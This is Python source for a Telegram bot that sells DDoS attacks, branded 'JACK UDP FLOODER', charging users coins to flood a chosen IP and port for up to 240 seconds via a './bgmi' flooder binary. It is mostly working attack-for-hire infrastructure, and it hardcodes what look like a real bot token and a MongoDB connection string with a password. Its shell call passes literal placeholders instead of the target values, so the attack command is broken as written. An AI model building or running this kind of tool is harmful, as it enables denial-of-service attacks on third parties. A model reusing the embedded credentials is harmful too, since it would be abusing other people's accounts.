import asyncio
from datetime import datetime, timedelta
from telegram import Update
from telegram.ext import Application, CommandHandler, CallbackContext
from motor.motor_asyncio import AsyncIOMotorClient

bot_start_time = datetime.now()
attack_in_progress = False
current_attack = None  # Store details of the current attack
attack_history = []  # Store attack logs

TELEGRAM_BOT_TOKEN = '7561613639:AAH2LCxIhhuxI6NxOLfY6pi1vVoonABPnHE'  # Replace with your bot token
ADMIN_USER_ID = 5019747597
MONGO_URI = "mongodb+srv://donmourya248:Santosh700@redhat.drq43.mongodb.net/RedHat?retryWrites=true&w=majority&appName=RedHat"
DB_NAME = "Sikandarr"
COLLECTION_NAME = "users"
ATTACK_TIME_LIMIT = 240 # Maximum attack duration in seconds
COINS_REQUIRED_PER_ATTACK = 5  # Coins required for an attack

# MongoDB setup
mongo_client = AsyncIOMotorClient(MONGO_URI)
db = mongo_client[DB_NAME]
users_collection = db[COLLECTION_NAME]

# Add a dictionary to store the last attack time for each user
user_last_attack_time = {}

async def get_user(user_id):
    """Fetch user data from MongoDB."""
    user = await users_collection.find_one({"user_id": user_id})
    if not user:
        return {"user_id": user_id, "coins": 0}
    return user

async def update_user(user_id, coins):
    """Update user coins in MongoDB."""
    await users_collection.update_one(
        {"user_id": user_id},
        {"$set": {"coins": coins}},
        upsert=True
    )

async def start(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*❄️ WELCOME TO JACK UDP FLOODER ❄️*\n\n"
        "*✨ Key Features: ✨*\n"
        "🚀 *To start a attack /attack*\n"
        "🏦 *To check your account  balance and approval status/myinfo*\n"
        "*⚠️ How to use⚠️*\n"
        "*To see commands list: /help*\n\n"
        "*💬 Queries or Issues? 💬*\n"
        "*Contact Admin: @JackHubOwner*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def ninja(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    args = context.args

    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(chat_id=chat_id, text="*You are not approved to use this command.*", parse_mode='Markdown')
        return

    if len(args) != 3:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Type: /ninja <add|rem> <user_id> <coins>*", parse_mode='Markdown')
        return

    command, target_user_id, coins = args
    coins = int(coins)
    target_user_id = int(target_user_id)

    user = await get_user(target_user_id)

    if command == 'add':
        new_balance = user["coins"] + coins
        await update_user(target_user_id, new_balance)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} ko {coins} coins added. Balance: {new_balance}.*", parse_mode='Markdown')
    elif command == 'rem':
        new_balance = max(0, user["coins"] - coins)
        await update_user(target_user_id, new_balance)
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} ke {coins} coins deducted. Balance: {new_balance}.*", parse_mode='Markdown')

async def attack(update: Update, context: CallbackContext):
    global attack_in_progress, attack_end_time

    chat_id = update.effective_chat.id
    user_id = update.effective_user.id
    args = context.args

    user = await get_user(user_id)

    # Check for cooldown only for non-admin users
    if user_id != ADMIN_USER_ID:
        last_attack_time = user_last_attack_time.get(user_id)
        if last_attack_time:
            cooldown_time = (last_attack_time - datetime.now()).total_seconds()
            if cooldown_time > 0:
                await context.bot.send_message(
                    chat_id=chat_id,
                    text=f"*⏳ Cooldown in progress! You can attack again in {int(cooldown_time)} seconds.*",
                    parse_mode='Markdown'
                )
                return

    if user["coins"] < COINS_REQUIRED_PER_ATTACK:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*💰 You dont have sufficient coin. 😂 DM:- @JackHubOwner*",
            parse_mode='Markdown'
        )
        return

    if attack_in_progress:
        remaining_time = (attack_end_time - datetime.now()).total_seconds()
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"*⚠️Abhi chudai chalu h thoda sabar kar jab wo khatam hoga tab tu chodna abhi {int(remaining_time)} seconds bache hain.*",
            parse_mode='Markdown'
        )
        return

    if len(args) != 3:
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                "*❌ wrong usage please type the right command like:*\n"
                "*👉 /attack <ip> <port> <duration>*\n"
                "*📌 Example: /attack 192.168.1.1 26547 240*"
            ),
            parse_mode='Markdown'
        )
        return

    ip, port, duration = args
    port = int(port)
    duration = int(duration)

    # Check for restricted ports
    restricted_ports = [17500, 20000, 20001, 20002]
    if port in restricted_ports or (100 <= port <= 999):
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                "*❌ Wrong port❌*"
            ),
            parse_mode='Markdown'
        )
        return

    if duration > ATTACK_TIME_LIMIT:
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                f"*⛔ Limit cross mat karo. tum sirf {ATTACK_TIME_LIMIT} seconds tak chod sakte ho.*\n"
                "*Agar zyada chodna h toh admin se baat karo! 😎*"
            ),
            parse_mode='Markdown'
        )
        return

    # Deduct coins
    new_balance = user["coins"] - COINS_REQUIRED_PER_ATTACK
    await update_user(user_id, new_balance)

    attack_in_progress = True
    attack_end_time = datetime.now() + timedelta(seconds=duration)
    await context.bot.send_message(
        chat_id=chat_id,
        text=(
            "*🚀 [ATTACK INITIATED] 🚀*\n\n"
            f"*💣 Target IP: {ip}*\n"
            f"*🔢 Port: {port}*\n"
            f"*🕒 Duration: {duration} seconds*\n"
            f"*💰 Coins Deducted: {COINS_REQUIRED_PER_ATTACK}*\n"
            f"*📉 Remaining Balance: {new_balance}*\n\n"
            "*🔥 Server JACK, Rotating ips every 5 seconds✅! 💥*"
        ),
        parse_mode='Markdown'
    )

    # Set the cooldown time for the user if they are not admin
    if user_id != ADMIN_USER_ID:
        user_last_attack_time[user_id] = datetime.now() + timedelta(seconds=duration + 60)

    asyncio.create_task(run_attack(chat_id, ip, port, duration, context))

async def run_attack(chat_id, ip, port, duration, context):
    global attack_in_progress, attack_end_time
    attack_in_progress = True

    try:
        command = f"./bgmi ip port time 350 300"
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()

        if stdout:
            print(f"[stdout]\n{stdout.decode()}")
        if stderr:
            print(f"[stderr]\n{stderr.decode()}")

    except Exception as e:
        await context.bot.send_message(
            chat_id=chat_id,
            text=f"*⚠️ Error: {str(e)}*\n*Command failed to execute. Contact admin if needed.*",
            parse_mode='Markdown'
        )

    finally:
        attack_in_progress = False
        attack_end_time = None
        await context.bot.send_message(
            chat_id=chat_id,
            text=(
                "*✅ [ATTACK FINISHED] ✅*\n\n"
                f"*💣 Target IP: {ip}*\n"
                f"*🔢 Port: {port}*\n"
                f"*🕒 Duration: {duration} seconds*\n\n"
                "*💥 Attack finished send feedback or bam!🚀*"
            ),
            parse_mode='Markdown'
        )

async def uptime(update: Update, context: CallbackContext):
    elapsed_time = (datetime.now() - bot_start_time).total_seconds()
    minutes, seconds = divmod(int(elapsed_time), 60)
    await context.bot.send_message(update.effective_chat.id, text=f"*⏰Bot uptime:* {minutes} minutes, {seconds} seconds", parse_mode='Markdown')

async def myinfo(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    user_id = update.effective_user.id

    user = await get_user(user_id)

    balance = user["coins"]
    message = (
        f"*📝 check your info:*\n"
        f"*💰 Coins: {balance}*\n"
        f"*😏 Status: Approved*\n"
        f"*✅!*"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def help(update: Update, context: CallbackContext):
    chat_id = update.effective_chat.id
    message = (
        "*🛠️ @JackHubOwner VIP DDOS Bot Help Menu 🛠️*\n\n"
        "📜 *Available Commands:* 📜\n\n"
        "1️⃣ *🔥 /attack <ip> <port> <duration>*\n"
        "   - *Is command ka use karke tum attack laga sakte ho.*\n"
        "   - *Example: /attack 192.168.1.1 20876 240*\n"
        "   - *📝 Note: Maximum time duration is 240s to increase dm:- @JackHubOwner.*\n\n"
        "2️⃣ *💳 /myinfo*\n"
        "   - *To check your account status and coins.*\n"
        "3️⃣ *🔧 /uptime*\n"
        "   - *To check bot uptime.*\n\n"
        "4️⃣ *👤 /users*\n"
        "   - *To check users.*\n\n"
        "4️⃣ *👤 /remove*\n"
        "   - *To remove users.*\n\n"
        "5️⃣ *❓ /help*\n"
        "   - *To check commands.*\n\n"
        "💥 *Keep fkking!* 💥"
    )
    await context.bot.send_message(chat_id=chat_id, text=message, parse_mode='Markdown')

async def users(update: Update, context: CallbackContext):
    """Display all users and their data, only for the admin."""
    chat_id = update.effective_chat.id

    # Only allow the admin to run this command
    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*You don't have permission to use this command.*",
            parse_mode='Markdown'
        )
        return

    # Fetch all users from MongoDB
    users_cursor = users_collection.find()
    user_data = await users_cursor.to_list(length=None)

    if not user_data:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*⚠️ No users found in the database.*",
            parse_mode='Markdown'
        )
        return

    # Send the user data in a formatted message
    message = "*📊 List of all users in the database: 📊*\n\n"
    for user in user_data:
        # Check if 'user_id' and 'coins' keys are present
        user_id = user.get('user_id', 'N/A')  # Default to 'N/A' if 'user_id' is missing
        coins = user.get('coins', 'N/A')  # Default to 'N/A' if 'coins' is missing
        message += f"**User  ID:** {user_id}  |  **Coins:** {coins}\n"

    # Send the message to the admin
    await context.bot.send_message(
        chat_id=chat_id,
        text=message,
        parse_mode='Markdown'
    )

async def remove_user(update: Update, context: CallbackContext):
    """Remove a user from the database, only for the admin."""
    chat_id = update.effective_chat.id

    # Only allow the admin to run this command
    if chat_id != ADMIN_USER_ID:
        await context.bot.send_message(
            chat_id=chat_id,
            text="*You dont have permission to use this command.*",
            parse_mode='Markdown'
        )
        return

    if len(context.args) != 1:
        await context.bot.send_message(chat_id=chat_id, text="*⚠️ Usage: /remove <user_id>*", parse_mode='Markdown')
        return

    target_user_id = int(context.args[0])

    # Remove the user from the database
    result = await users_collection.delete_one({"user_id": target_user_id})

    if result.deleted_count > 0:
        await context.bot.send_message(chat_id=chat_id, text=f"*✅ User {target_user_id} ko nikal diya h malik.*", parse_mode='Markdown')
    else:
        await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ User {target_user_id} ye chutiya is bot m nhi h malik.*", parse_mode='Markdown')

def main():
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("ninja", ninja))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("myinfo", myinfo))
    application.add_handler(CommandHandler("help", help))
    application.add_handler(CommandHandler("uptime", uptime))
    application.add_handler(CommandHandler("users", users))
    application.add_handler(CommandHandler("remove", remove_user))  # Add the new /remove command handler
    application.run_polling()

if __name__ == '__main__':
    main()
